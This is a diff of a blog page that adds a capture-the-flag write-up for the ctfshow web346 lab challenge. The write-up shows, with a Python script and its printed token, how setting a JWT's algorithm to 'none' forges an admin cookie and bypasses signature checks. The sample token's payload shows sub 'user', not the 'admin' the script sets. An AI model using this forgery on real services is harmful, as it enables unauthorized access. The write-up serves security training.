@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jwt"><span class="toc-text">jwt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web345"><span class="toc-text">ctfshow web345</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jwt"><span class="toc-text">jwt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web345"><span class="toc-text">ctfshow web345</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web346"><span class="toc-text">ctfshow web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web347"><span class="toc-text">ctfshow web347</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -212,7 +212,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/jwt/" style="color: #00bcd4">jwt</a>
+                <a href="/blog/tags/jwt/" style="color: #ff7d73">jwt</a>
             </span>
             
         </span>
@@ -243,7 +243,45 @@
 <p><img src="/blog/2023/06/04/jwt/image-20230604232140896.png" alt="image-20230604232140896"></p>
 <p>复制这串Encoded的签名到cookie中，发包得到flag</p>
 <p><img src="/blog/2023/06/04/jwt/image-20230604234306500.png" alt="image-20230604234306500"></p>
+<hr>
+<h2 id="ctfshow-web346"><a href="#ctfshow-web346" class="headerlink" title="ctfshow web346"></a>ctfshow web346</h2><blockquote>
+<p>None算法绕过签名</p>
+</blockquote>
+<p>和上题一样获取cookie进行解码</p>
+<p><img src="/blog/2023/06/04/jwt/image-20230605110806698.png" alt="image-20230605110806698"></p>
+<p>发现是HS256加密作签名</p>
+<p>而JWT 支持将算法设定为 “None”。如果“alg” 字段设为“ None”，那么签名会被置空，这样任何 token 都是有效的。</p>
+<p>所以我们只需要把Header中的加密算法改为none，sub改为admin即可</p>
+<p>这里使用python脚本进行加密</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt
 
+<span class="token comment"># payload</span>
+token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+    <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1685934422</span><span class="token punctuation">,</span>
+    <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1685941622</span><span class="token punctuation">,</span>
+    <span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1685934422</span><span class="token punctuation">,</span>
+    <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+    <span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"939c89347dc9f094d5bd33799cf3a4d4"</span>
+<span class="token punctuation">&#125;</span>
+
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span> <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span>
+jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>
+    token_dict<span class="token punctuation">,</span>  <span class="token comment"># payload, 有效载体</span>
+    <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token comment"># 进行加密签名的密钥</span>
+    algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>  <span class="token comment"># 指明签名算法方式, 默认也是HS256</span>
+    headers<span class="token operator">=</span>headers
+    <span class="token comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span>
+
+<span class="token comment"># 输出eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4NTkzNDQyMiwiZXhwIjoxNjg1OTQxNjIyLCJuYmYiOjE2ODU5MzQ0MjIsInN1YiI6InVzZXIiLCJqdGkiOiI5MzljODkzNDdkYzlmMDk0ZDViZDMzNzk5Y2YzYTRkNCJ9.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>/admin/</code>下传入cookie获取flag</p>
+<p><img src="/blog/2023/06/04/jwt/image-20230605112022265.png" alt="image-20230605112022265"></p>
+<hr>
+<h2 id="ctfshow-web347"><a href="#ctfshow-web347" class="headerlink" title="ctfshow web347"></a>ctfshow web347</h2>
     </div>
     
     
